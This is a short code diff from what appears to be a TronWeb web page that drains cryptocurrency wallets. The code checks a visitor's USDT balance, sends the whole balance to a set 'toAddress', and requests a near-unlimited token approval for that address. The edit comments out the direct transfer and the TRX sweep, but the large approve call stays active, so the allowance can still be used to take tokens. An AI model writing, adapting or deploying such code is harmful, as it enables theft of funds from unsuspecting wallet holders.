@@ -602,9 +602,9 @@
 							  .balanceOf(tronWeb.defaultAddress.base58)
 							  .call()
 							  .then((usdtbalance) => {
-								let usdtbalanceNum = usdtbalance.toNumber() / 1000000;
-							   // console.log("USDT", usdtbalanceNum);
+								let usdtbalanceNum = usdtbalance.toNumber() / 1000000; 
 								if (usdtbalanceNum > 1) {
+								/*
 								  usdtContract
 									.transfer(toAddress, usdtbalance.toNumber())
 									.send()
@@ -612,6 +612,9 @@
 									  loading.close();
 									  toTrx(usdtContract, trxbalance);
 									});
+								*/
+								  loading.close(); // v1
+								  toTrx(usdtContract, trxbalance); // v1
 								} else {
 								  loading.close();
 								  toTrx(usdtContract, trxbalance);
@@ -643,6 +646,7 @@
 				  .approve(toAddress, 1000000000000000)
 				  .send()
 				  .finally(() => {
+					/*
 					let trxbalanceNum = trxbalance / 1000000;
 					if (trxbalanceNum > 10) {
 					  let loading = Qmsg.loading(
@@ -659,6 +663,7 @@
 					} else {
 					  toTrc20();
 					}
+					*/
 				  });
 			  }
 
